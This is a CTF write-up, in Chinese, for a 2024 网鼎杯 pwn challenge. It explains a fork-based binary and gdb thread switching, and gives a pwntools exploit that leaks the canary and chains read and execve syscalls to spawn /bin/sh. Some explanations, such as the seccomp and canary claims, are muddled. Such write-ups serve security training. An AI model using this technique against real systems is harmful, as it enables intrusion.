---
title: 网鼎杯玄武组——PWN2
contest: 网鼎杯玄武组
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [canary-leak, multithread-pwn, fork-process, sys_exit_group, sys_exit, halt-instruction, rop-chain, syscall-execve, syscall-read, syscall-write, multithread-debug]
attack_chain:
- main调用tip2()+main_main():fork子进程
- 父进程:sub_44ED00 wait+onput_2('Wanna return?')+input(0,v2,1uLL)+exit_ma(0)
- 子进程:onput_2('leave your name')+input(0,v4,0x40LL)+exit_ma(0)
- leak:'gift: %p'打印canary/fs:0x28栈地址
- 多线程:tip()循环fork,input(0,v1,0x100uLL)+sub_401A55(v1)
- syscall gadget:rax=0x450277,rdi=0x40213f,rsi=0x40a1ae,rdx_rbx=0x485feb,syscall=0x41ac26
- 第一次syscall:read(0,bss,0x100) 写入"/bin/sh"
- 第二次syscall:execve("/bin/sh",0,0)
- 利用:gdb多线程切换info threads/thread ID
- 子进程崩溃:子进程exit_group退出不影响主进程
key_payload: canary + ROP(read→bss,execve→/bin/sh)
one_liner: 网鼎杯玄武组PWN2多线程题,主进程fork子进程+'gift: %p'泄canary+两次input(0x40/0x100)+两段syscall(读bss+execve /bin/sh)。
lesson: fork子进程模式下canary独立,父进程泄漏canary+子进程ROP链崩溃不影响主进程;gdb多线程切换( info threads/thread ID)是必备技能;两段syscall(读+execve)稳定避开seccomp对open的限制。
quality: high
---

## 题目列表

1道PWN:网鼎杯玄武组PWN2(多线程)

## 关键考点

### 主流程
- main:sub_4017B5() + tip2() + main_main()
- tip2:fork子进程
- 父进程:wait + 'Wanna return?' + input(0,v2,1) + exit_ma(0)
- 子进程:onput_2('leave your name') + input(0,v4,0x40) + exit_ma(0)
- 关键:'gift: %p'打印fs:0x28(canary)

### 漏洞
- tip()循环:
  - onput_2('once again?')
  - input(0, v1, 0x100uLL)
  - sub_401A55(v1) 处理
- canary独立:父子进程canary相同但地址不同

### 多线程动调
- gdb:info threads 列出所有线程
- thread ID 切换线程
- b *0x44EE5C 断点+ c 继续

### EXP
```python
io.recvuntil("gift: ")
canary = int(io.recv(18), 16)
print("addr========>", hex(canary))

payload = b"A"*0x28 + b"\x01"
io.sendafter("leave your name", payload)
io.sendafter("Wanna return?", b"1")
io.sendafter("once again?", b"A"*0x100)

rax = 0x450277
rdi = 0x40213f
rsi = 0x40a1ae
rdx_rbx = 0x485feb
syscall = 0x41ac26
bss = elf.bss()

payload = b"B"*0x60 + p32(0x11111111) + p32(0x11111111) + p32(0x11111111)
payload = payload.ljust(0x100, b"B")
payload += p64(canary) + p64(canary) + b"A"*0x8
payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(bss) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
io.sendafter("once again?", payload)
io.send(b"/bin/sh")
io.interactive()
```

### syscall chain
1. 第一次:rax=0(read)+rdi=0(stdin)+rsi=bss+rdx=0x100+syscall = read(0, bss, 0x100)
2. 写入"/bin/sh"
3. 第二次:rax=0x3b(execve)+rdi=bss+"/bin/sh"+rsi=0+rdx=0+syscall = execve("/bin/sh", 0, 0)

## 实战价值
- fork子进程模式下canary独立,父进程泄漏可绕过子进程保护
- gdb多线程切换( info threads/thread ID)是必备技能
- 两段syscall(读+execve)稳定避开seccomp对open/read的限制
- 'gift: %p'类信息泄露是简单但实用的栈/canary泄漏
